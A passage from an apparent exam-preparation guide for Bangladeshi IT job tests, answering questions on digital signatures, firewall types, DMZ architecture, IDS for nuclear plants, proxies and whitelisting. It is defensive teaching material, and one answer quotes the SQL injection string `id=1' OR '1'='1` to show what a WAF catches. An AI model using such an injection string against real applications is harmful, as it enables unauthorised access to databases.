        SEND --> V2[Receiver decrypts signature with<br/>SENDER'S PUBLIC key → Digest B]
        V1 --> CMP{Digest A = Digest B ?}
        V2 --> CMP
        CMP -->|Yes| OK[Valid — authentic and unaltered]
        CMP -->|No| BAD[Invalid — tampered or forged]
    ```

    Example — a bank loan approval letter
    - The branch manager writes the approval letter and signs it digitally with **his private key**.
    - The head office receives the letter plus the signature.
    - It hashes the received letter and separately decrypts the signature with the **manager's public key**.
    - If both digests match, head office knows (a) the letter really came from that manager, (b) not a word has been changed, and (c) the manager cannot later deny sending it.
    - If even one character of the letter were altered in transit, the two digests would differ completely (the avalanche effect) and the signature would fail.

    Three guarantees provided
    - **Authentication** — only the holder of the private key could have produced the signature.
    - **Integrity** — any change to the document breaks the match.
    - **Non-repudiation** — the sender cannot deny having signed it.

31. **b) What is a digital signature? And why is that important?** *[Ministry of Finance Programmer 2013 compact it 1272 (ET: N/A)]*

Answer: A digital signature is a cryptographic value attached to a digital document that proves who created it and that it has not been altered since. It is created by hashing the document and encrypting that hash with the signer's PRIVATE key.

    How it works in brief
    - Sign: `Signature = Encrypt(Hash(document), sender's private key)`
    - Verify: decrypt the signature with the sender's public key to recover the hash, independently hash the received document, and compare. A match confirms validity.

    Why it is important

    - **Authentication** — it proves the identity of the sender. Only the holder of the private key could have produced that signature.
    - **Integrity** — any change to the document, even a single character, breaks the hash match, so tampering is immediately detected.
    - **Non-repudiation** — the signer cannot later deny having signed, because nobody else holds the private key. This is the property a handwritten signature is supposed to provide, and it is what makes digital contracts enforceable.
    - **Legal validity** — recognised by law. In Bangladesh, digital signatures are legally valid under the **ICT Act 2006**, with licensed Certifying Authorities issuing certificates under the Controller of Certifying Authorities (CCA).
    - **Efficiency** — documents are signed and transmitted in seconds, removing courier time, printing and physical storage.
    - **Cost saving** — no paper, no postage, no physical archive.

    Where it is used
    - SSL/TLS certificates that secure every HTTPS website, signed software updates (so malware cannot pose as a legitimate update), e-tendering and e-GP, income tax and VAT returns, banking instructions, and blockchain transactions.

    - Important distinction: a **digital signature** is cryptographic and verifiable; a scanned image of a handwritten signature (an "electronic signature") is neither — it can be copied and pasted onto any document.

## Firewalls & Network Defense (20)

1. **As a cybersecurity analyst at a nuclear power plant, what IDS strategies and steps are required to prevent cyberattacks?** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: A nuclear plant is Critical Information Infrastructure with an OT (Operational Technology) network controlling physical processes. A safety failure here is not a data loss but a physical hazard, so the IDS strategy must be built around that.

   (a) IDS placement strategy
   - **Network IDS (NIDS)** at the IT/OT boundary, inside the DMZ, and on each control-network segment — deployed on a SPAN/mirror port or a network TAP so it is passive and cannot itself disturb the process.
   - **Host IDS (HIDS)** on engineering workstations, HMIs and historian servers.
   - **Protocol-aware IDS** that understands industrial protocols — Modbus, DNP3, IEC 61850, OPC-UA — because a generic IT IDS cannot read them.
   - **Passive monitoring only** on the safety instrumented system. Nothing active may ever be placed inline with a safety loop.

   (b) Detection methods to combine
   - **Signature-based** — catches known malware and exploits, including ICS-specific families such as Stuxnet, Industroyer and TRITON.
   - **Anomaly-based** — the strongest method in OT, because industrial traffic is highly repetitive and predictable. A deviation from the learned baseline is far more meaningful than in an office network.
   - **Protocol whitelisting** — define exactly which commands each device may issue; anything else is an alert.
   - **Behavioural** — detect an unusual sequence such as an engineering workstation writing to a PLC outside a maintenance window.

   (c) Architectural steps
   - **Purdue model segmentation** — Level 0/1 (field devices and controllers) up to Level 4/5 (enterprise IT), with strict boundaries between levels.
   - **Data diode** at the IT/OT boundary for one-way data flow out of the plant, so no traffic can physically enter.
   - **Air gap or tightly controlled DMZ** between corporate IT and the control network.
   - **No direct internet access** from any OT device.

   (d) Operational steps
   - **Establish a baseline** of normal traffic over a long observation period before enabling anomaly alerting.
   - **Asset inventory** — every device, firmware version and communication path documented. You cannot protect what you have not catalogued.
   - **24/7 SOC** with staff trained in ICS, not just IT.
   - **SIEM correlation** of IDS alerts with physical process data — an alert that coincides with an unexpected valve movement is a very different matter.
   - **Incident response plan tested by drill**, with a defined safe-shutdown procedure.
   - **Regular patching in maintenance windows**, with virtual patching by IPS where a device cannot be patched.
   - **Strict removable media control** — Stuxnet entered through a USB drive.
   - **Vendor and supply chain vetting**, and controlled remote-access sessions with recording.
   - **Personnel security and insider-threat monitoring**, plus regular awareness training.

   - Governing principle: in IT the priority order is Confidentiality-Integrity-Availability; in a nuclear plant it is **Safety-Availability-Integrity-Confidentiality**. Every control must be judged against whether it could itself endanger the process.

2. **What is Packet Filter of Firewall?** *[National Legal Aid Services Organization Assistant Maintenance Engineer 18.10.2025 compact it 1450 (ET: N/A)]*

Answer: A packet-filtering firewall is the simplest type of firewall. It examines each packet INDEPENDENTLY against a set of rules and decides to allow or drop it, without remembering anything about previous packets.

   What it inspects
   - Source IP address and destination IP address
   - Source port and destination port
   - Protocol (TCP, UDP, ICMP)
   - TCP flags such as SYN and ACK
   - The interface the packet arrived on

   It operates at the **network and transport layers** (OSI layers 3 and 4).

   Example rule set
   ```
   ALLOW  TCP  any -> 192.168.1.10  port 80    (allow web traffic to the web server)
   ALLOW  TCP  any -> 192.168.1.10  port 443
   DENY   TCP  any -> any           port 23    (block Telnet)
   DENY   ALL  any -> any                      (default deny)
   ```

   Advantages
   - Very fast, with minimal performance impact.
   - Simple to implement and cheap.
   - Transparent to users and applications.

   Disadvantages
   - **Stateless** — it cannot tell whether a packet belongs to an established connection, so return traffic rules must be written manually and are easy to get wrong.
   - Cannot inspect the packet PAYLOAD, so it cannot detect malware or an application-layer attack.
   - Vulnerable to IP spoofing and fragmented-packet attacks.
   - Limited logging and auditing.
   - Does not hide the internal network topology.

   - This is why modern deployments use stateful inspection or next-generation firewalls instead; packet filtering survives mainly as router ACLs for coarse, fast filtering.

3. **Write down the difference between Next-Generation Firewall (NGFW) and Web Application Firewall (WAF)?** *[Islami Bank PLC Senior Officer (Network/System) 14.03.2025 compact it 1331 (ET: BUET)]*

| NGFW | WAF |
|---|---|
| নেটওয়ার্ক-ভিত্তিক সুরক্ষা | ওয়েব অ্যাপ্লিকেশন সুরক্ষা |
| Layer 3, 4, 7 | Layer 7 |
| Network-based Attacks (DDoS, Malware, IPS) | Web-based Attacks (SQL Injection, XSS, CSRF) |
| Palo Alto, Fortinet, Cisco Firepower | Cloudflare WAF, AWS WAF, Imperva WAF |

| NGFW | WAF |
|---|---|
| নেটওয়ার্ক-ভিত্তিক সুরক্ষা | ওয়েব অ্যাপ্লিকেশন সুরক্ষা |
| Layer 3, 4, 7 | Layer 7 |
| Network-based Attacks (DDoS, Malware, IPS) | Web-based Attacks (SQL Injection, XSS, CSRF) |
| Palo Alto, Fortinet, Cisco Firepower | Cloudflare WAF, AWS WAF, Imperva WAF |

   Answer: The table given in the question is correct. Expanding on it:

   | Point | NGFW | WAF |
   |---|---|---|
   | Protects | The whole network and all its traffic | One specific web application |
   | OSI layers | 3, 4 and 7 | 7 only |
   | Placement | At the network perimeter or between segments | Directly in front of the web server |
   | Traffic inspected | All protocols — HTTP, FTP, SMTP, DNS, SSH | HTTP and HTTPS only |
   | Attacks blocked | Malware, intrusions, unauthorised applications, some DDoS, C2 traffic | SQL injection, XSS, CSRF, file inclusion, session hijacking, bot abuse |
   | Key features | Application awareness, integrated IPS, deep packet inspection, TLS inspection, user identity, threat intelligence | Request and response inspection, input validation, OWASP Top 10 rule sets, rate limiting, bot mitigation, virtual patching |
   | Understanding of application logic | Knows which application it is, but not the logic inside it | Understands HTTP parameters, cookies, form fields and JSON payloads |
   | Products | Palo Alto, Fortinet FortiGate, Cisco Firepower, Check Point | Cloudflare WAF, AWS WAF, Imperva, F5 ASM, ModSecurity |

   Why BOTH are needed
   - An NGFW cannot see that `id=1' OR '1'='1` inside an HTTP parameter is an SQL injection — to the NGFW it is simply legitimate HTTPS traffic to port 443 from an allowed source.
   - A WAF cannot stop a port scan, an SSH brute force or malware spreading laterally on the internal network.
   - They defend different layers, so a bank deploys an NGFW at the perimeter AND a WAF in front of its internet banking application.

4. **Bangladesh Bank have client server and the communication with Mail Server, DNS server, Web server. Bangladesh Bank want to ensure the security using firewall on those server. Draw a diagram with the scenario.** *[Bangladesh Bank Assistant Director (ICT) 07.02.2025 compact it 1323 (ET: DU)]*

Answer: The correct design is a **dual-firewall DMZ architecture** — public-facing servers in a DMZ, internal systems behind a second firewall.

   ```mermaid
   flowchart TD
       I[Internet<br/>untrusted] --> FW1[External Firewall<br/>NGFW + IPS]
       FW1 --> DMZ
       subgraph DMZ [DMZ — semi-trusted]
           W[Web Server<br/>port 80/443]
           M[Mail Server<br/>port 25/587/993]
           D[DNS Server<br/>port 53]
       end
       DMZ --> FW2[Internal Firewall]
       FW2 --> LAN
       subgraph LAN [Internal LAN — trusted]
           C[Client workstations]
           DB[(Core Banking Database)]
           AD[Domain Controller]
       end
   ```

   Firewall rules for this scenario

   | Source | Destination | Port | Action |
   |---|---|---|---|
   | Internet | Web server (DMZ) | 443 | ALLOW |
   | Internet | Mail server (DMZ) | 25, 587 | ALLOW |
   | Internet | DNS server (DMZ) | 53 | ALLOW |
   | Internet | Internal LAN | any | **DENY** |
   | DMZ | Internal database | 1433/1521 only, from the web server only | ALLOW (restricted) |
   | DMZ | Internal LAN | anything else | **DENY** |
   | Internal LAN | Internet | 80, 443 | ALLOW via proxy |
   | Any | Any | everything else | **DENY (default deny)** |

   Why this design
   - **The DMZ is the key idea.** Public servers must be reachable from the internet, so if one is compromised the attacker lands in the DMZ — not on the core banking network.
   - The **internal firewall** blocks any path from a compromised DMZ server into the LAN, except one tightly restricted database port.
   - **Default deny** — everything not explicitly permitted is blocked.
   - Additional layers: IPS on both firewalls, a WAF in front of the web server, mail gateway filtering, DNSSEC, TLS everywhere, and centralised logging to a SIEM.

5. **What is Demilitarized Zone (DMZ) and sandbox for security test?** *[PGCB Assistant Engineer (CSE) 17.05.2024 compact it 398 (ET: BUET)]*

Answer:

   **(a) DMZ (Demilitarized Zone)**
   - A separate network segment that sits between the untrusted internet and the trusted internal LAN, holding the servers that must be reachable from outside.
   - The internet is untrusted, the DMZ is semi-trusted, and the internal LAN is trusted.
   - Servers placed in a DMZ: web server, mail server, DNS server, FTP server, proxy, VoIP gateway.

   ```mermaid
   flowchart LR
       I[Internet] --> F1[External Firewall] --> D[DMZ<br/>Web, Mail, DNS] --> F2[Internal Firewall] --> L[Internal LAN]
   ```

   - **Purpose**: if a public server is compromised, the attacker is contained in the DMZ. The second firewall prevents them from reaching the internal network, so the breach is limited.
   - Two designs: **single firewall** with three interfaces (cheaper, one device is a single point of failure) and **dual firewall** (stronger, preferably from two different vendors so one vulnerability does not defeat both).

   **(b) Sandbox for security testing**
   - An isolated, controlled environment in which untrusted code or files can be executed and observed without any risk to the real system or network.

   - **How it works**: the suspicious file is run inside a virtual machine or container that is cut off from production. Its behaviour is recorded — files created, registry keys changed, network connections attempted, processes spawned.
   - **Uses**: malware analysis, testing unknown email attachments before delivery, browser and application isolation, and testing patches before deployment.
   - **Advantages**: detects zero-day and unknown malware by BEHAVIOUR rather than signature, and any damage is discarded with the sandbox.
   - **Limitations**: modern malware often detects that it is inside a sandbox (checking for VM artefacts, mouse movement or a delay timer) and stays dormant. Sandboxing also adds latency.
   - Examples: Cuckoo Sandbox, Any.Run, FireEye, Windows Sandbox.

6. **Different types of network firewalls. Explain NGFW compared to traditional firewall.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 301 (ET: BIBM)]*

Answer:

   (a) Types of network firewall

   | Type | OSI layer | What it inspects |
   |---|---|---|
   | **Packet filtering** | 3, 4 | IP addresses, ports, protocol. Stateless |
   | **Stateful inspection** | 3, 4 | The same, PLUS a state table of active connections |
   | **Circuit-level gateway** | 5 | TCP handshakes; verifies the session, not the content |
   | **Application-level gateway (proxy)** | 7 | Full application payload; acts as intermediary |
   | **Next-Generation Firewall (NGFW)** | 3-7 | Everything above, plus application identity, users and threat intelligence |
   | **Web Application Firewall** | 7 | HTTP/HTTPS requests to a specific web application |

   Also classified as **hardware** firewalls (appliances protecting a network) and **software** firewalls (host-based, protecting one machine).

   (b) NGFW compared with a traditional firewall

   | Point | Traditional firewall | NGFW |
   |---|---|---|
   | Basis of decision | IP address and port number | Application identity, user identity, content |
   | Layers | 3 and 4 | 3 to 7 |
   | Application awareness | None — port 443 is just "HTTPS" | Distinguishes Facebook from Salesforce, both on 443 |
   | Encrypted traffic | Passes through unexamined | TLS/SSL inspection decrypts and inspects |
   | IPS | Separate appliance | Integrated |
   | Malware detection | None | Antivirus, sandboxing, threat intelligence feeds |
   | User identity | IP address only | Integrates with Active Directory to see the actual user |
   | Policy example | "Allow port 443" | "Allow Sales team to use Salesforce, block file uploads to personal cloud storage" |

   Why NGFW became necessary
   - Almost all modern traffic now runs over ports 80 and 443. A traditional firewall that only sees "port 443 allowed" is effectively blind — malware command-and-control, data exfiltration and unauthorised applications all travel over the same permitted port.
   - NGFW closes that gap by identifying WHAT application is running and WHO is running it, not merely which port is in use.

7. **What is Firewall? Discuss about different types of Firewall.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 528 (ET: MIST)]*

Answer: A firewall is a network security device — hardware, software or both — that monitors incoming and outgoing traffic and permits or blocks it according to a defined rule set. It is the barrier between a trusted internal network and an untrusted external one.

   Types of firewall

   **(a) Packet filtering firewall (Layer 3-4)**
   - Examines each packet independently against rules on IP address, port and protocol.
   - Fast and cheap, but stateless and cannot inspect payload.

   **(b) Stateful inspection firewall (Layer 3-4)**
   - Maintains a **state table** of active connections, so return traffic for an established session is allowed automatically.
   - Far more secure than packet filtering and is the modern baseline.

   **(c) Circuit-level gateway (Layer 5)**
   - Verifies the TCP handshake to confirm a session is legitimate, but does not inspect the content. Low overhead, limited protection. SOCKS proxies work this way.

   **(d) Application-level gateway / proxy firewall (Layer 7)**
   - Acts as an intermediary — the client talks to the proxy, and the proxy talks to the server. It inspects the full application payload.
   - Most secure and hides the internal topology, but slow and not transparent.

   **(e) Next-Generation Firewall (NGFW)**
   - Combines stateful inspection with integrated IPS, application awareness, user identity, TLS inspection, malware sandboxing and threat intelligence.
   - The standard for enterprise perimeters today.

   **(f) Web Application Firewall (WAF)**
   - Protects one web application from SQL injection, XSS, CSRF and other OWASP Top 10 attacks by inspecting HTTP requests.

   By deployment
   - **Hardware firewall** — a dedicated appliance protecting the whole network.
   - **Software firewall** — installed on a host, protecting that one machine (Windows Defender Firewall, iptables).
   - **Cloud firewall (FWaaS)** — delivered as a service, protecting cloud workloads.

   - Practical design: a bank uses an NGFW at the perimeter, stateful firewalls between internal segments, host firewalls on servers, and a WAF in front of internet banking — defence in depth rather than a single device.

8. **Draw a diagram of LAN including network Firewall. Why is firewall important in network security? List 5 major types of network firewalls. Differentiate between Traditional Firewall and Next Generation Firewall.** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 532 (ET: MIST)]*

Answer:

   (a) LAN diagram with firewall
   ```mermaid
   flowchart TD
       I[Internet] --> R[Router]
       R --> FW[Firewall / NGFW]
       FW --> DMZ[DMZ<br/>Web, Mail, DNS servers]
       FW --> SW[Core Switch]
       SW --> S1[File Server]
       SW --> S2[Database Server]
       SW --> AP[Wireless AP]
       SW --> PC1[Workstations]
       SW --> PR[Network Printer]
   ```
   - The firewall sits between the router and the internal switch, so ALL traffic entering or leaving the LAN passes through it. Public servers sit in a separate DMZ interface.

   (b) Why a firewall is important
   - **Blocks unauthorised access** from the internet into the internal network.
   - **Enforces security policy** — only explicitly permitted traffic passes; everything else is denied.
   - **Prevents malware entry** and blocks outbound command-and-control traffic from an infected host.
   - **Protects internal servers** by exposing only the required ports.
   - **Logging and auditing** — a record of who connected where, needed for investigation and compliance.
   - **Network segmentation** — limits how far an attacker can move after a breach.
   - **Hides internal structure** through NAT, so internal addresses are not visible outside.
   - **Regulatory requirement** — mandated by the Bangladesh Bank ICT Security Guideline and PCI DSS.

   (c) Five major types
   - Packet filtering firewall, Stateful inspection firewall, Circuit-level gateway, Application-level gateway (proxy), Next-Generation Firewall.

   (d) Traditional vs Next-Generation firewall

   | Point | Traditional Firewall | Next-Generation Firewall |
   |---|---|---|
   | Decision basis | IP address, port, protocol | Application, user, content, threat intelligence |
   | OSI layers | 3 and 4 | 3 to 7 |
   | Deep packet inspection | No | Yes |
   | Encrypted traffic | Not inspected | TLS decryption and inspection |
   | IPS | Separate device | Built in |
   | Malware detection | No | Antivirus and sandboxing built in |
   | User awareness | IP address only | Integrated with Active Directory |
   | Cost and performance | Cheaper, faster | Costlier, more processing required |

9. **What is firewall and why it is used?** *[Dhaka Mass Transit Company Limited (DMTCL) Assistant Engineer (ICT) 27.01.2023 compact it 475 (ET: N/A)]*

Answer: A firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules, forming a barrier between a trusted internal network and untrusted external networks.

   Why it is used
   - **Block unauthorised access** — prevents attackers on the internet from reaching internal systems.
   - **Enforce security policy** — implements a default-deny rule so only approved traffic passes.
   - **Prevent malware and intrusion** — blocks known malicious traffic entering, and command-and-control traffic leaving.
   - **Protect servers** — exposes only the required ports of each server, closing everything else.
   - **Control internal usage** — restricts staff access to non-work sites and applications.
   - **Monitoring and logging** — records connection attempts for investigation, forensics and compliance.
   - **Network segmentation** — separates finance, HR and guest networks so a breach in one does not spread.
   - **Hide internal addresses** using NAT.
   - **Support VPN** — many firewalls terminate site-to-site and remote-access VPN tunnels.

   - Important limitation: a firewall cannot stop an attack that arrives through traffic it is configured to allow — a phishing email over permitted HTTPS, or an insider misusing legitimate access. It is one layer of defence in depth, not a complete solution.

10. **What is the function of a firewall?** *[BCC Assistant Programmer 11.11.2023 compact it 545 (ET: N/A)]*

Answer: The primary function of a firewall is to **filter network traffic** — inspecting every packet entering or leaving a network and allowing or blocking it according to a defined rule set.

    Its specific functions
    - **Traffic filtering** — permit or deny based on source and destination IP, port and protocol.
    - **Access control** — enforce which users and systems may reach which resources.
    - **Connection state tracking** — a stateful firewall records active sessions so return traffic is recognised as legitimate.
    - **Network Address Translation (NAT)** — hides internal addresses behind a public IP.
    - **Logging and alerting** — records all connections and raises alerts on policy violations.
    - **VPN termination** — establishes and manages encrypted tunnels for remote access.
    - **Application control** (NGFW) — identifies and controls specific applications regardless of port.
    - **Intrusion prevention** (NGFW) — detects and blocks known attack signatures.
    - **Content and URL filtering** — blocks access to prohibited categories of website.

    - In one line: a firewall is the enforcement point where a written security policy becomes an actual technical control.

11. **DMZ and firewall placement in a diagram. (Approximate)** *[MGMCL Assistant Manager (ICT) 20.05.2022 compact it 651 (ET: BUET)]*

Answer: Two standard architectures.

    **Design A — dual firewall (screened subnet), the more secure option**
    ```mermaid
    flowchart LR
        I[Internet<br/>UNTRUSTED] --> F1[External Firewall]
        F1 --> D[DMZ<br/>SEMI-TRUSTED<br/>Web, Mail, DNS, FTP]
        D --> F2[Internal Firewall]
        F2 --> L[Internal LAN<br/>TRUSTED<br/>Database, workstations]
    ```
    - Two firewalls, ideally from different vendors so a single vulnerability cannot defeat both.
    - An attacker who compromises a DMZ server still faces a second firewall before reaching the LAN.

    **Design B — single firewall with three legs (three-legged DMZ)**
    ```
              Internet
                 |
            +----------+
            | Firewall |
            +----------+
             /        \
          DMZ          Internal LAN
    (Web, Mail, DNS)   (DB, workstations)
    ```
    - One firewall with three interfaces: external, DMZ and internal. Cheaper, but the single device is a single point of failure.

    Rule principles for either design
    - Internet → DMZ: allow ONLY the specific service ports (80, 443, 25, 53).
    - Internet → Internal LAN: **DENY everything**.
    - DMZ → Internal LAN: deny by default; allow only one restricted path, such as the web server to the database on one port.
    - Internal LAN → Internet: allow outbound through a proxy.
    - Default action for anything not matched: **DENY**.

12. **What is Blacklist and Whitelist? Write down the difference between Black list and White list.** *[SPCB Sub-Assistant Programmer 2022 compact it 737 (ET: N/A)]*

Answer:
    - **Blacklist** — a list of entities that are explicitly BLOCKED. Everything else is allowed by default.
    - **Whitelist** — a list of entities that are explicitly ALLOWED. Everything else is blocked by default.

    | Point | Blacklist | Whitelist |
    |---|---|---|
    | Default action | Allow | Deny |
    | The list contains | What is forbidden | What is permitted |
    | Security level | Lower | Much higher |
    | Protection against unknown threats | None — a new threat is not on the list, so it is allowed | Full — anything unknown is blocked |
    | Maintenance effort | Constant — the list must grow with every new threat | Higher at setup, lower afterwards |
    | Flexibility | High — users can access anything not listed | Low — every legitimate need must be approved |
    | False positives | Few | Many, especially at first |
    | Usability | Convenient | Restrictive, can frustrate users |
    | Examples | Antivirus signature lists, spam blocklists, blocked-website lists | Application whitelisting, IP whitelisting for admin access, permitted-software lists |

    - Whitelisting is fundamentally more secure because it implements **default deny**. A blacklist can only stop what is already known, which is why it fails against zero-day attacks.
    - In practice both are used together: whitelist for high-security zones such as a bank's server network, and blacklist for general user internet access where whitelisting would be unmanageable.

13. **What is DMZ in data center? Describe using diagram? Write the network devices in this system?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 756 (ET: N/A)]*

Answer: In a data centre, a DMZ is a separate, isolated network segment that hosts the servers which must be reachable from the internet, kept apart from the internal trusted network by firewalls.

    Diagram
    ```mermaid
    flowchart TD
        I[Internet] --> E[Edge Router]
        E --> F1[External Firewall / NGFW]
        F1 --> LB[Load Balancer]
        LB --> DSW[DMZ Switch]
        subgraph DMZ
            W[Web Servers]
            M[Mail Gateway]
            D[DNS Servers]
            P[Reverse Proxy / WAF]
        end
        DSW --> W
        DSW --> M
        DSW --> D
        DSW --> P
        DSW --> F2[Internal Firewall]
        F2 --> CSW[Core Switch]
        subgraph Internal
            AP[Application Servers]
            DB[(Database Servers)]
            AD[Directory Services]
        end
        CSW --> AP
        CSW --> DB
        CSW --> AD
    ```

    Network devices in this system

    | Device | Role |
    |---|---|
    | **Edge router** | Connects to the ISP, performs initial routing and basic filtering |
    | **External firewall (NGFW)** | Controls all traffic between internet and DMZ; runs IPS and application control |
    | **Load balancer** | Distributes incoming requests across web servers, and provides SSL offloading |
    | **Reverse proxy / WAF** | Terminates client connections and inspects HTTP for application attacks |
    | **DMZ switch** | Layer 2 connectivity within the DMZ, with VLAN separation |
    | **Internal firewall** | Controls the DMZ-to-internal path; the critical containment boundary |
    | **Core switch** | High-speed backbone of the internal network |
    | **IDS/IPS sensors** | Monitor traffic on a mirror port for intrusion |
    | **VPN concentrator** | Terminates remote-access and site-to-site tunnels |
    | **SIEM collector** | Aggregates logs from every device |

    Why the DMZ matters
    - Public servers MUST be reachable and are therefore the most likely to be compromised. Placing them in a DMZ means a successful attack on the web server does not automatically give access to the core banking database.

14. **Difference between blacklisting and whitelisting. Which is more secure and why?** *[PGCB Assistant Engineer (CSE) 30.09.2021 compact it 864 (ET: BUET)]*

Answer:

    | Point | Blacklisting | Whitelisting |
    |---|---|---|
    | Approach | Deny what is known bad, allow everything else | Allow what is known good, deny everything else |
    | Default policy | Permit | Deny |
    | Unknown item | Allowed | Blocked |
    | Zero-day protection | None | Strong |
    | Maintenance | Continuous — must chase every new threat | Front-loaded — approve the known-good set once |
    | Usability | Convenient for users | Restrictive; every new requirement needs approval |
    | Best for | Open environments, general web browsing | High-security zones, servers, ICS, ATMs, kiosks |

    **Whitelisting is significantly more secure.** Reasons:

    - **It implements default deny**, the fundamental principle of secure design. Anything not explicitly approved cannot run or connect.
    - **It stops unknown and zero-day threats.** A blacklist can only block what has already been identified and catalogued; a brand-new malware sample is simply not on it, so it passes.
    - **The problem is bounded.** The set of legitimate applications in an organisation is finite and knowable; the set of malicious ones is infinite and grows daily. Defending a finite set is achievable; chasing an infinite one is not.
    - **It resists polymorphic malware**, which changes its signature specifically to evade blacklists.
    - **Failure mode is safe.** If the whitelist is incomplete, something legitimate is blocked — inconvenient but harmless. If a blacklist is incomplete, something malicious runs — which is a breach.

    Why blacklisting is still used
    - Whitelisting is impractical where legitimate need is unpredictable, such as general internet browsing for thousands of users.
    - Real deployments combine both: application whitelisting on servers and ATMs, blacklisting for user web access, with a firewall applying default-deny at the network layer.

15. **Write difference between Antivirus and Firewall.** *[BREB Assistant General Manager (IT) 2021 compact it 934 (ET: N/A)]*

Answer:

    | Point | Firewall | Antivirus |
    |---|---|---|
    | What it protects | The NETWORK — traffic entering and leaving | The HOST — files and programs on the machine |
    | Operates on | Network packets | Files, memory, running processes |
    | Position | At the network boundary, or on the host | Installed on each individual computer |
    | Threat handled | Unauthorised network access, port scanning, intrusion attempts | Virus, worm, trojan, ransomware, spyware |
    | Method | Rule-based filtering by IP, port and protocol | Signature matching, heuristics, behaviour analysis |
    | Timing | Blocks the threat BEFORE it enters | Detects and removes AFTER the file has arrived |
    | Can it remove an infection | No | Yes — quarantine and delete |
    | Type | Hardware or software | Software only |
    | Updates needed | Rule changes | Frequent virus definition updates |

    Why both are necessary
    - A firewall cannot detect malware inside traffic it is configured to allow. A user downloading an infected file over permitted HTTPS passes the firewall entirely — the antivirus is what catches it on arrival.
    - An antivirus cannot stop a network-level attack such as a port scan, a brute-force login attempt or a DDoS flood, because no file is involved.
    - They cover different layers, which is why every security baseline requires both, plus patching and user awareness.

16. **What is firewell? Draw a LAN network to showing firewall.** *[BREB Junior Assistant Manager (ICT) 2021 compact it 949 (ET: N/A)]*

Answer: A firewall is a security device that filters network traffic between a trusted internal network and an untrusted external network, allowing or blocking packets according to a defined rule set.

    LAN diagram with firewall
    ```mermaid
    flowchart TD
        I[Internet] --> M[Modem / ISP link]
        M --> R[Router]
        R --> FW[FIREWALL]
        FW --> SW[Core Switch]
        SW --> S1[File Server]
        SW --> S2[Database Server]
        SW --> AP[Wireless Access Point]
        SW --> PC1[PC 1]
        SW --> PC2[PC 2]
        SW --> PR[Printer]
        AP --> L1[Laptop]
        AP --> MB[Mobile devices]
    ```

    Key placement rule
    - The firewall sits **between the router and the internal switch**, so every packet entering or leaving the LAN must pass through it. There is no path around it.
    - If the organisation runs public servers, a third interface creates a **DMZ**, so those servers are separated from the internal LAN.

    What the firewall enforces here
    - Inbound from the internet: denied by default; only specific published services permitted.
    - Outbound from the LAN: HTTP/HTTPS allowed, unnecessary protocols blocked.
    - Wireless guests: separated onto their own VLAN with no access to servers.
    - All connections logged for audit.

17. **What is proxy server? Explain it.** *[BREB Assistant Junior Engineer (IT) 2019 compact it 1123 (ET: BREB)]*

Answer: A proxy server is an intermediary that sits between a client and a destination server. The client sends its request to the proxy, the proxy forwards it on its own behalf, receives the response and returns it to the client. The destination server never sees the client directly.

    ```mermaid
    flowchart LR
        C[Client] -->|1. request| P[Proxy Server]
        P -->|2. forwards request| S[Web Server]
        S -->|3. response| P
        P -->|4. returns response| C
    ```

    Types of proxy
    - **Forward proxy** — sits in front of CLIENTS, used by an organisation to control and monitor outbound internet access. This is the usual meaning.
    - **Reverse proxy** — sits in front of SERVERS, receiving requests from the internet on their behalf. Used for load balancing, SSL termination and hiding the real servers. Nginx and HAProxy are examples.
    - **Transparent proxy** — intercepts traffic without client configuration; the user does not know it is there.
    - **Anonymous proxy** — hides the client's IP from the destination.

    Functions and benefits
    - **Caching** — frequently requested pages are stored locally, so repeat requests are served instantly. This saves bandwidth and speeds up browsing.
    - **Content filtering** — blocks prohibited websites and categories, enforcing organisational policy.
    - **Anonymity** — the destination sees only the proxy's IP address, not the client's.
    - **Access control and logging** — records who accessed what and when, for audit and investigation.
    - **Bandwidth control** — rate limiting per user or per site.
    - **Security** — can scan content for malware before it reaches the client, and hides the internal network structure.
    - **Bypass geographic restriction** — a proxy in another country makes the request appear to originate there.

    Limitations
    - It is a single point of failure and a potential bottleneck.
    - A malicious or compromised proxy can read all unencrypted traffic passing through it.
    - It adds latency, and HTTPS inspection requires installing the proxy's certificate on every client, which itself has privacy implications.

18. **What is firewall? explain its work. Draw a LAN network and a firewall where firewall will be situated.** *[Bangladesh Bank Assistant Programmer 2019 compact it 1156 (ET: DU)]*

Answer:

    (a) Firewall
    - A security device that monitors and filters network traffic between a trusted internal network and an untrusted external one, permitting or blocking packets according to a configured rule set.

    (b) How it works
    - **Step 1 — Inspect.** Every packet crossing the boundary is examined: source and destination IP, source and destination port, protocol, and (in a stateful firewall) which connection it belongs to.
    - **Step 2 — Match against rules.** The rule table is checked from top to bottom. Each rule specifies source, destination, service and an action of ALLOW or DENY.
    - **Step 3 — Apply the first matching rule.** Processing stops at the first match.
    - **Step 4 — Default deny.** If no rule matches, the implicit final rule blocks the packet. This is the central principle: anything not explicitly permitted is refused.
    - **Step 5 — Track state.** A stateful firewall records the connection in a state table, so the return packets of an approved session are recognised and allowed automatically.
    - **Step 6 — Log.** The decision is recorded for audit and investigation.

    Example rule table

    | # | Source | Destination | Service | Action |
    |---|---|---|---|---|
    | 1 | Internet | DMZ web server | HTTPS 443 | ALLOW |
    | 2 | Internal LAN | Internet | HTTP, HTTPS | ALLOW |
    | 3 | Internet | Internal LAN | any | DENY |
    | 4 | any | any | any | DENY (implicit) |

    (c) Where the firewall is placed
    ```mermaid
    flowchart TD
        I[Internet] --> R[Router]
        R --> FW[FIREWALL<br/>placed here — the only path in or out]
        FW --> DMZ[DMZ: Web, Mail, DNS]
        FW --> SW[Core Switch]
        SW --> SRV[Internal Servers / Database]
        SW --> PC[Workstations]
    ```
    - The firewall must be the **single choke point** between the internal network and the internet. If any path bypasses it, the whole control is void.
    - Large networks also place internal firewalls between segments — for example separating the branch network from the core banking network — so a breach in one zone cannot spread.

19. **What is Stateful and Stateless Firewall?** *[Dutch Bangla Bank Assistant Network/Hardware Engineer 2019 compact it 1159 (ET: BUET)]*

Answer:

    **Stateless firewall**
    - Examines each packet **in isolation**, with no memory of anything that came before.
    - Decisions are made purely on static header values: source IP, destination IP, ports, protocol.
    - It does not know whether a packet belongs to an existing conversation.
